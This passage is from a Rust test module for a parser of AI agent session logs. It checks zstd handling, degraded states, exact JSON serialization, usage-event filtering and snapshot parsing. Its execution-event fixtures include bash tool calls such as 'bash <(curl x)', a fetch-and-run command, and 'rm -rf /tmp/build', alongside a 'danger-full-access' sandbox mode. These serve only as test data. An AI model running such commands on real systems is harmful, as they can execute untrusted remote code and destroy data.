        std::fs::write(&path, &frames).unwrap();

        let v = read_session_log(&path);
        assert_eq!(v["invoked"], json!(["b"]));
        assert_eq!(v["degraded"], json!(false));
        let _ = std::fs::remove_dir_all(&t);
    }

    #[test]
    fn read_session_log_corrupt_zstd_is_zstd_decode_error_not_non_json() {
        let t = std::env::temp_dir().join(format!("av-dsh-zstdbad-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&t);
        std::fs::create_dir_all(&t).unwrap();
        let path = t.join("session.jsonl.zstd");
        std::fs::write(&path, b"\x28\xb5\x2f\xfd not a real frame").unwrap();
        let v = read_session_log(&path);
        assert_eq!(v["degraded"], json!("zstd-decode-error"));
        assert_eq!(v["catalog_entries"], json!([]));
        assert_eq!(v["execution_events"], Value::Null);
        let _ = std::fs::remove_dir_all(&t);
    }

    #[test]
    fn zstd_suffix_never_reported_as_non_json() {
        // §6.3-4 的判据：`.zstd` 后缀是「reader 不认识格式」，不是「日志坏了」。
        // 现在 ruzstd 落地后它直接解压；解压失败是 zstd-decode-error。退化点：
        // 万一某天 ruzstd 被移除，这里必须显式报 unsupported-compression，
        // 不许滑回 non-json。
        let t = std::env::temp_dir().join(format!("av-dsh-zstdsfx-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&t);
        std::fs::create_dir_all(&t).unwrap();
        let path = t.join("session.jsonl.zstd");
        std::fs::write(&path, b"plain text but with a .zstd name").unwrap();
        let v = read_session_log(&path);
        assert_ne!(v["degraded"], json!("non-json"));
        assert_ne!(v["degraded"], json!(false));
        let _ = std::fs::remove_dir_all(&t);
    }

    #[test]
    fn read_session_evidence_dir_falls_back_to_zstd() {
        // 真机目录里通常只有 session.jsonl.zstd（58/58）。目录注入指向没有
        // 裸 jsonl 的目录时，必须退到 .zstd 而不是报 file-missing。
        let t = std::env::temp_dir().join(format!("av-dsh-evdir-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&t);
        std::fs::create_dir_all(&t).unwrap();
        let mut frames = Vec::new();
        append_frame(&mut frames, "{\"type\":\"session\",\"version\":0,\"id\":\"s\",\"delegationDepth\":0}\n");
        std::fs::write(t.join("session.jsonl.zstd"), &frames).unwrap();

        let prev = std::env::var("AGENT_VITALS_DSH_SESSION_LOG").ok();
        std::env::set_var("AGENT_VITALS_DSH_SESSION_LOG", &t);
        let (source, ev) = read_session_evidence();
        std::env::remove_var("AGENT_VITALS_DSH_SESSION_LOG");
        if let Some(p) = prev {
            std::env::set_var("AGENT_VITALS_DSH_SESSION_LOG", p);
        }
        assert_eq!(source.as_deref(), Some(t.to_str().unwrap()));
        assert_eq!(ev.unwrap()["degraded"], json!(false));
        let _ = std::fs::remove_dir_all(&t);
    }

    #[test]
    fn complete_fixture_serializes_byte_for_byte() {
        // 期望串取自 Python `json.dumps(..., ensure_ascii=False, separators=(",", ":"))`
        // 对同一 fixture 的实际输出 —— 键序、值、布尔全部逐字节一致。
        let v = read_session_log(&fixture("fixtures/dsh/complete.jsonl"));
        let compact = serde_json::to_string(&v).unwrap();
        assert_eq!(
            compact,
            r#"{"catalog_entries":["repo-auditor","release-notes","commit-summarizer","test-runner"],"invoked":["release-notes"],"selected":["commit-summarizer"],"execution_events":[{"type":"turn/start","seq":0,"time":1750000001000,"data":{"turn":1}},{"type":"step/start","seq":1,"time":1750000002000,"data":{"turn":1,"step":1}},{"type":"step/end","seq":3,"time":1750000004000,"data":{"turn":1,"step":1}},{"type":"turn/end","seq":4,"time":1750000005000,"data":{"turn":1,"reason":{"kind":"completed"}}},{"type":"turn/start","seq":5,"time":1750000006000,"data":{"turn":2}},{"type":"step/start","seq":6,"time":1750000007000,"data":{"turn":2,"step":1}},{"type":"step/end","seq":8,"time":1750000009000,"data":{"turn":2,"step":1}},{"type":"turn/end","seq":9,"time":1750000010000,"data":{"turn":2,"reason":{"kind":"completed"}}},{"type":"turn/start","seq":10,"time":1750000011000,"data":{"turn":3}},{"type":"step/start","seq":11,"time":1750000012000,"data":{"turn":3,"step":1}},{"type":"user/message","seq":13,"time":1750000014000,"data":{"id":"aaaaaaaa-0000-4000-8000-000000000004","role":"user","content":[{"type":"text","text":"<skill_content name=\"release-notes\">\n<skill_resources>\nBase directory for this skill: /Users/alice/.dsh/skills/release-notes\n</skill_resources>\n\n<skill_instructions>\nGenerate release notes from merged PRs.\n</skill_instructions>\n</skill_content>"}],"source":{"kind":"skill-invocation","name":"release-notes","form":"instructions"}}},{"type":"step/end","seq":15,"time":1750000016000,"data":{"turn":3,"step":1}},{"type":"turn/end","seq":16,"time":1750000017000,"data":{"turn":3,"reason":{"kind":"completed"}}},{"type":"turn/start","seq":17,"time":1750000018000,"data":{"turn":4}},{"type":"step/start","seq":18,"time":1750000019000,"data":{"turn":4,"step":1}},{"type":"tool/call","seq":19,"time":1750000020000,"data":{"turn":4,"step":1,"callId":"cccccccc-0000-4000-8000-000000000001","name":"skill","arguments":"{\"name\":\"commit-summarizer\"}"}},{"type":"tool/result","seq":20,"time":1750000021000,"data":{"turn":4,"step":1,"message":{"id":"cccccccc-0000-4000-8000-000000000002","role":"user","content":[{"type":"tool-result","toolCallId":"cccccccc-0000-4000-8000-000000000001","content":[{"type":"text","text":"<skill_content name=\"commit-summarizer\">\n<skill_resources>\nBase directory for this skill: /Users/alice/.dsh/skills/commit-summarizer\n</skill_resources>\n\n<skill_instructions>\nSummarize git commits.\n</skill_instructions>\n</skill_content>"}],"isError":false}],"source":{"kind":"tool","callId":"cccccccc-0000-4000-8000-000000000001"}}}},{"type":"step/end","seq":22,"time":1750000023000,"data":{"turn":4,"step":1}},{"type":"turn/end","seq":23,"time":1750000024000,"data":{"turn":4,"reason":{"kind":"completed"}}}],"usage_events":[{"type":"user/message","seq":7,"time":1750000008000,"data":{"id":"aaaaaaaa-0000-4000-8000-000000000002","role":"user","content":[{"type":"text","text":"<system-reminder>\nA skill is a reusable set of task-specific instructions. The following skills are available in this session:\n\n<available_skills>\n- `repo-auditor`: Audit a repository for security, licensing, and supply-chain hygiene; reports findings ordered by severity.\n- `release-notes`: Generate release notes from merged pull requests and conventional commits since the last tag, grouping breaking changes, features, and fixes…\n- `commit-summarizer`: Summarize a range of git commits into concise bullet points for changelogs and PR reviews.\n- `test-runner`: Run the project's test suite and group failures by module with the first failing assertion.\n</available_skills>\n\nIf the user names a skill, or the task clearly matches a skill's description, call the `skill` tool with the exact skill name before taking task actions.\n</system-reminder>"}],"source":{"kind":"skill-catalog","form":"catalog","entries":[{"name":"repo-auditor","description":"Audit a repository for security, licensing, and supply-chain hygiene; reports findings ordered by severity."},{"name":"release-notes","description":"Generate release notes from merged pull requests and conventional commits since the last tag, grouping breaking changes, features, and fixes…"},{"name":"commit-summarizer","description":"Summarize a range of git commits into concise bullet points for changelogs and PR reviews."},{"name":"test-runner","description":"Run the project's test suite and group failures by module with the first failing assertion."}]}}}],"cwd":"/Users/alice/projects/demo","degraded":false}"#
        );
    }

    #[test]
    fn reads_the_checked_in_complete_fixture() {
        let v = read_session_log(&fixture("fixtures/dsh/complete.jsonl"));
        assert_eq!(v["catalog_entries"], json!(["repo-auditor", "release-notes",
                                               "commit-summarizer", "test-runner"]));
        assert_eq!(v["invoked"], json!(["release-notes"]));
        assert_eq!(v["selected"], json!(["commit-summarizer"]));
        assert_eq!(v["degraded"], json!(false));
    }

    #[test]
    fn reads_the_checked_in_incomplete_fixture() {
        let v = read_session_log(&fixture("fixtures/dsh/incomplete.jsonl"));
        assert_eq!(v["catalog_entries"], json!(["repo-auditor", "release-notes"]));
        assert_eq!(v["invoked"], json!([]));
        assert_eq!(v["selected"], json!([]));
        // EXECUTION_EVENT_TYPES 扩展后：turn/start·step/start·step/end·turn/end 进
        // execution_events（3 个 turn × 4 = 12 条边界信号；user/message 与 text
        // 不在抽取集合）。这里断言类型序列而非整串，行为不受后续字段影响。
        let evs = v["execution_events"].as_array().unwrap();
        let types: Vec<&str> = evs.iter()
            .filter_map(|e| e.get("type").and_then(|t| t.as_str())).collect();
        assert_eq!(types, ["turn/start", "step/start", "step/end", "turn/end",
                           "turn/start", "step/start", "step/end", "turn/end",
                           "turn/start", "step/start", "step/end", "turn/end"]);
        assert_eq!(v["degraded"], json!(false));
    }

    #[test]
    fn execution_events_all_types_byte_for_byte() {
        // 覆盖全部 13 类执行事件（9 类单事件规则证据 + 4 类轨迹层 turn/step
        // 边界信号）：tool/call（arguments 是原始 JSON 字符串）、tool/result
        // （error.code）、approval/asked+decided、sandbox/mode、hook/invoked+
        // result、code-dispatch-start+dispatch（arguments 是 JSON 对象）、
        // turn/start·step/start·step/end·turn/end；`user/message` 不在抽取集合。
        // 另含 3 条成本账事件（request/header + usage chunk + 带 usage 的
        // message）与 2 条应被过滤的（文本 chunk、无 usage 的 message）——
        // usage_events 只保留 11/12/14。
        // 期望串取自 Python `json.dumps(..., ensure_ascii=False, separators=(",", ":"))`
        // 对同一 JSONL 的输出 —— 键序、值、`data` 原样透传全部逐字节一致。
        let text = r#"{"type":"session","version":0,"id":"s","delegationDepth":0}
{"type":"turn/start","seq":1,"time":1001,"data":{"turn":1}}
{"type":"step/start","seq":2,"time":1002,"data":{"turn":1,"step":1}}
{"type":"tool/call","seq":3,"time":1003,"data":{"turn":1,"step":1,"callId":"c1","name":"bash","arguments":"{\"command\":\"rm -rf /tmp/build\"}"}}
{"type":"tool/result","seq":4,"time":1004,"data":{"turn":1,"step":1,"message":"denied","error":{"name":"FsError","code":"FS_SANDBOX_DENIED"},"meta":{"n":1}}}
{"type":"approval/asked","seq":5,"time":1005,"data":{"id":"a1","toolName":"bash","callId":"c1","reason":"escalation"}}
{"type":"approval/decided","seq":6,"time":1006,"data":{"id":"a1","outcome":"allowed-once"}}
{"type":"sandbox/mode","seq":7,"time":1007,"data":{"mode":"danger-full-access"}}
{"type":"hook/invoked","seq":8,"time":1008,"data":{"turn":1,"point":"PreToolUse","handlerId":"h1"}}
{"type":"hook/result","seq":9,"time":1009,"data":{"turn":1,"point":"PreToolUse","handlerId":"h1","decision":"pass"}}
{"type":"tool/code-dispatch-start","seq":10,"time":1010,"data":{"rootCallId":"r1","parentCallId":"p1","subCallId":"p1:code:0","name":"bash","arguments":{"command":"bash <(curl x)"}}}
{"type":"tool/code-dispatch","seq":11,"time":1011,"data":{"rootCallId":"r1","parentCallId":"p1","subCallId":"p1:code:0","name":"bash","arguments":{"command":"bash <(curl x)"},"isError":false,"content":[]}}
{"type":"step/end","seq":12,"time":1012,"data":{"turn":1,"step":1}}
{"type":"turn/end","seq":13,"time":1013,"data":{"turn":1,"reason":{"kind":"completed"}}}
{"type":"user/message","seq":14,"time":1014,"data":{"source":{"kind":"user"}},"surfaceOp":"append"}
"#;
        let v = parse_session_log(text);
        let compact = serde_json::to_string(&v).unwrap();
        assert_eq!(
            compact,
            r#"{"catalog_entries":[],"invoked":[],"selected":[],"execution_events":[{"type":"turn/start","seq":1,"time":1001,"data":{"turn":1}},{"type":"step/start","seq":2,"time":1002,"data":{"turn":1,"step":1}},{"type":"tool/call","seq":3,"time":1003,"data":{"turn":1,"step":1,"callId":"c1","name":"bash","arguments":"{\"command\":\"rm -rf /tmp/build\"}"}},{"type":"tool/result","seq":4,"time":1004,"data":{"turn":1,"step":1,"message":"denied","error":{"name":"FsError","code":"FS_SANDBOX_DENIED"},"meta":{"n":1}}},{"type":"approval/asked","seq":5,"time":1005,"data":{"id":"a1","toolName":"bash","callId":"c1","reason":"escalation"}},{"type":"approval/decided","seq":6,"time":1006,"data":{"id":"a1","outcome":"allowed-once"}},{"type":"sandbox/mode","seq":7,"time":1007,"data":{"mode":"danger-full-access"}},{"type":"hook/invoked","seq":8,"time":1008,"data":{"turn":1,"point":"PreToolUse","handlerId":"h1"}},{"type":"hook/result","seq":9,"time":1009,"data":{"turn":1,"point":"PreToolUse","handlerId":"h1","decision":"pass"}},{"type":"tool/code-dispatch-start","seq":10,"time":1010,"data":{"rootCallId":"r1","parentCallId":"p1","subCallId":"p1:code:0","name":"bash","arguments":{"command":"bash <(curl x)"}}},{"type":"tool/code-dispatch","seq":11,"time":1011,"data":{"rootCallId":"r1","parentCallId":"p1","subCallId":"p1:code:0","name":"bash","arguments":{"command":"bash <(curl x)"},"isError":false,"content":[]}},{"type":"step/end","seq":12,"time":1012,"data":{"turn":1,"step":1}},{"type":"turn/end","seq":13,"time":1013,"data":{"turn":1,"reason":{"kind":"completed"}}}],"usage_events":[],"cwd":null,"degraded":false}"#
        );
    }
    #[test]
fn execution_events_null_when_degraded() {
        // 读到一半遇到垃圾行：execution_events 必须是 null，绝不假装空列表 = 0 条。
        let text = r#"{"type":"session","version":0,"id":"s","delegationDepth":0}
{"type":"tool/call","seq":1,"time":1001,"data":{"name":"bash","arguments":"{\"command\":\"ls\"}"}}
garbage line
"#;
        let v = parse_session_log(text);
        assert_eq!(v["degraded"], json!("non-json"));
        assert_eq!(v["execution_events"], Value::Null);
    }

    #[test]
    fn execution_events_passthrough_preserves_tool_call_arguments_string() {
        // tool/call 的 `arguments` 是原始 JSON 字符串（未解析），必须原样保留成字符串，
        // 不能被解析成对象（code-dispatch* 才是对象）。
        let text = r#"{"type":"session","version":0,"id":"s","delegationDepth":0}
{"type":"tool/call","seq":1,"time":1001,"data":{"turn":1,"step":1,"callId":"c1","name":"bash","arguments":"{\"command\":\"rm -rf /tmp/build\"}"}}
"#;
        let v = parse_session_log(text);
        assert_eq!(v["execution_events"], json!([
            {"type": "tool/call", "seq": 1, "time": 1001,
             "data": {"turn": 1, "step": 1, "callId": "c1", "name": "bash",
                      "arguments": "{\"command\":\"rm -rf /tmp/build\"}"}}
        ]));
    }

    #[test]
    fn execution_events_passthrough_preserves_code_dispatch_arguments_object() {
        // code-dispatch* 的 `arguments` 是 JSON 对象（不是字符串），必须原样保留成对象。
        let text = r#"{"type":"session","version":0,"id":"s","delegationDepth":0}
{"type":"tool/code-dispatch-start","seq":1,"time":1001,"data":{"rootCallId":"r1","parentCallId":"p1","subCallId":"p1:code:0","name":"bash","arguments":{"command":"bash <(curl x)"}}}
"#;
        let v = parse_session_log(text);
        assert_eq!(v["execution_events"], json!([
            {"type": "tool/code-dispatch-start", "seq": 1, "time": 1001,
             "data": {"rootCallId": "r1", "parentCallId": "p1", "subCallId": "p1:code:0",
                      "name": "bash", "arguments": {"command": "bash <(curl x)"}}}
        ]));
    }

    /// 真实回归：`compaction/summary` 带真实 usage，但曾经在这一层（比
    /// 折叠层更早生效）就被挡在外面——`usage.rs` 的残差哨兵因此永远看不到
    /// 它，报出"0 处漏算"这个假阴性，全量语料扫描很久才靠人工翻原始日志
    /// 才发现。
    #[test]
    fn is_usage_event_keeps_compaction_summary_with_usage() {
        let event = json!({"type": "compaction/summary", "data": {
            "compactionId": "c1", "model": "deepseek-v4-flash",
            "provider": "deepseek-official",
            "usage": {"inputTokens": 462, "outputTokens": 3520, "cacheReadTokens": 245760},
        }});
        assert!(is_usage_event(&event, "compaction/summary"));
    }

    #[test]
    fn is_usage_event_drops_compaction_start_without_usage() {
        // compaction/start·end 没有 usage 字段——不该被结构兜底误留（它们
        // 的 payload 里根本没有认得的 token 字段名）。
        let event = json!({"type": "compaction/start", "data": {"compactionId": "c1", "turn": null}});
        assert!(!is_usage_event(&event, "compaction/start"));
    }

    #[test]
    fn is_usage_event_drops_compaction_summary_with_non_object_usage() {
        let event = json!({"type": "compaction/summary", "data": {"compactionId": "c1", "usage": "oops"}});
        assert!(!is_usage_event(&event, "compaction/summary"));
    }

    /// 结构兜底：类型完全不认识，但 payload 里有认得的 token 字段——留给
    /// 折叠层的残差哨兵去报警，不在这一层悄悄丢掉。这正是这次
    /// `compaction/summary` 漏算 bug 的教训：宁可多留、让哨兵去判断，
    /// 不能在 adapter 层就把决定权收走。
    #[test]
    fn is_usage_event_keeps_unknown_type_with_usage_shaped_payload() {
        let event = json!({"type": "some/future-event-type", "data": {
            "inputTokens": 100, "outputTokens": 10,
        }});
        assert!(is_usage_event(&event, "some/future-event-type"));
    }

    #[test]
    fn is_usage_event_drops_unknown_type_without_usage_shaped_payload() {
        let event = json!({"type": "some/future-event-type", "data": {"note": "nothing here"}});
        assert!(!is_usage_event(&event, "some/future-event-type"));
    }

    /// 已知类型但形状不对（文本流 chunk）——精确判据不接住，兜底也接不住
    /// （文本块没有 token 字段），最终应该被丢弃。
    #[test]
    fn is_usage_event_drops_non_usage_assistant_chunk() {
        let event = json!({"type": "assistant/chunk", "data": {"chunk": {"type": "text", "text": "hi"}}});
        assert!(!is_usage_event(&event, "assistant/chunk"));
    }

    #[test]
    fn snapshot_parses_full_shape() {
        let text = r#"{"schema_version":"1.0","producer":"dsh-agent-vitals","observer":null,"skills":[{"name":"a","description":"d"},{"name":"b"}],"complete":true,"written_at":"2026-08-14T09:12:03Z"}"#;
        let v = parse_snapshot(text);
        assert_eq!(v["catalog_entries"], json!(["a", "b"]));
        assert_eq!(v["complete"], json!(true));
        assert_eq!(v["observer"], Value::Null);
        assert_eq!(v["written_at"], json!("2026-08-14T09:12:03Z"));
        assert_eq!(v["degraded"], json!(false));
    }

    #[test]
    fn snapshot_complete_false_is_not_zero() {
        // complete===false 是「发现不完整」，不是「目录为空」——不能当 0 次用。
        let text = r#"{"schema_version":"1.0","producer":"dsh-agent-vitals","observer":null,"skills":[{"name":"a"}],"complete":false,"written_at":"2026-08-14T09:12:03Z"}"#;
        let v = parse_snapshot(text);
        assert_eq!(v["complete"], json!(false));
        assert_eq!(v["catalog_entries"], json!(["a"]));
        assert_eq!(v["degraded"], json!(false));
    }

    #[test]
    fn snapshot_observer_and_written_at_are_string_or_null() {
        let text = r#"{"skills":[{"name":"a"}],"complete":true,"observer":42,"written_at":null}"#;
        let v = parse_snapshot(text);
        // observer 非字符串 → null（与 Python `isinstance(observer, str) else None` 对齐）
        assert_eq!(v["observer"], Value::Null);
        assert_eq!(v["written_at"], Value::Null);
    }

    #[test]
    fn snapshot_missing_complete_degrades() {
        let v = parse_snapshot(r#"{"skills":[{"name":"a"}]}"#);
        assert_eq!(v["degraded"], json!("missing-complete"));
        assert_eq!(v["catalog_entries"], json!([]));
    }

    #[test]
    fn snapshot_missing_skills_degrades() {
        let v = parse_snapshot(r#"{"complete":true}"#);
        assert_eq!(v["degraded"], json!("missing-skills"));
    }

    #[test]
    fn snapshot_non_json_degrades() {
        assert_eq!(parse_snapshot("not json")["degraded"], json!("non-json"));
    }

    #[test]
    fn snapshot_non_object_degrades() {
        assert_eq!(parse_snapshot("[1,2,3]")["degraded"], json!("not-an-object"));
    }

    #[test]
    fn snapshot_bool_complete_is_not_accepted() {
        // complete 非布尔（如 0/1）不能当 partial 答案用——把 0/1 当 complete 会把
        // 「部分答案」误判成「目录为空」。
        assert_eq!(
            parse_snapshot(r#"{"skills":[{"name":"a"}],"complete":1}"#)["degraded"],
            json!("missing-complete")
        );
    }
}
